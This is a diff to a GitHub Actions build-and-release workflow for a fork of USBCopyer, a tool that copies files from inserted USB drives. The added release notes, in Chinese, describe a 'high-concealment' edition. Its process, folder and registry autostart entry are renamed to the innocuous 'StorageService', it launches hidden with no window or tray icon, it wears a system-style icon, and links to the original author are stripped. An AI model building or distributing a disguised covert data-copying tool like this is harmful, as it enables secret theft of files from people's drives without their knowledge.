@@ -3,7 +3,11 @@ name: build
 on:
   workflow_dispatch:
   push:
+    branches: [ master ]
   pull_request:
+
+env:
+  VERSION: 5.11-gh1
 
 jobs:
   build:
@@ -15,12 +19,55 @@ jobs:
     - name: Add msbuild to PATH
       uses: microsoft/setup-msbuild@v2
 
-    - name: Build solution
+    - name: Restore NuGet packages
+      run: msbuild USBCopyer.sln -t:restore
+
+    - name: Build Release
+      run: msbuild USBCopyer.sln -t:build -p:Configuration=Release -p:Platform="Any CPU"
+
+    - name: Build Release.Net3.5
+      run: msbuild USBCopyer.sln -t:build -p:Configuration=ReNet3.5 -p:Platform="Any CPU"
+
+    - name: Rename assets with version
+      shell: pwsh
       run: |
-        msbuild USBCopyer.sln -t:build -property:Configuration=Release
-        msbuild USBCopyer.sln -t:build -property:Configuration=ReNet3.5
+        Get-ChildItem Release -Filter *.exe | ForEach-Object {
+          $new = $_.BaseName + ".v$env:VERSION" + $_.Extension
+          Move-Item $_.FullName (Join-Path $_.DirectoryName $new)
+        }
+        Get-ChildItem Release | Select-Object Name, Length
 
     - uses: actions/upload-artifact@v4
       with:
-        name: release
-        path: USBCopyer/bin/
+        name: StorageService-v${{ env.VERSION }}
+        path: Release/
+
+  release:
+    needs: build
+    if: github.event_name == 'workflow_dispatch'
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/download-artifact@v4
+      with:
+        name: StorageService-v${{ env.VERSION }}
+        path: dist
+
+    - name: Publish GitHub Release
+      uses: softprops/action-gh-release@v2
+      with:
+        tag_name: v${{ env.VERSION }}
+        name: StorageService v${{ env.VERSION }}
+        body: |
+          StorageService —— USBCopyer 高隐藏性定制版
+
+          - 程序名 / 进程名 / 输出目录 / 注册表自启动项全部改为 StorageService（中性化）
+          - 默认隐藏启动（无窗口、无托盘图标），仅显式 /gui 参数显示界面
+          - 系统风格齿轮图标（主图标 + 托盘默认/工作图标）
+          - 移除界面中指向原作者域名/项目页的外部链接
+          - 原版全部功能保留（U 盘复制 / 黑白名单 / 自定义分类规则 / 回调等）
+
+          使用：StorageService.exe /gui 打开设置界面；默认（无参数）隐藏运行。
+          版本 v${{ env.VERSION }}（跟随上游 V5.11，本 fork 定制第 1 版）
+        files: dist/*
+        draft: true
